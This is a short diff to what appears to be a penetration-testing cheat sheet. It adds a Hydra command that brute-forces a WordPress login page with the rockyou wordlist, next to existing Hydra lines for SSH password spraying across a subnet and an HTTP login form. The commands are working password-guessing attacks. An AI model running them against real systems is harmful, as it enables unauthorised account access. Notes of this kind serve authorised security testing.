@@ -31,3 +31,9 @@ hydra -l root -p toor 10.0.0.0/24 ssh
 ```
 hydra 10.0.0.1 http-form-post "/action.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
 ```
+
+Wordpress login:
+
+```
+hydra 10.0.0.1 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:S=Location" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+```
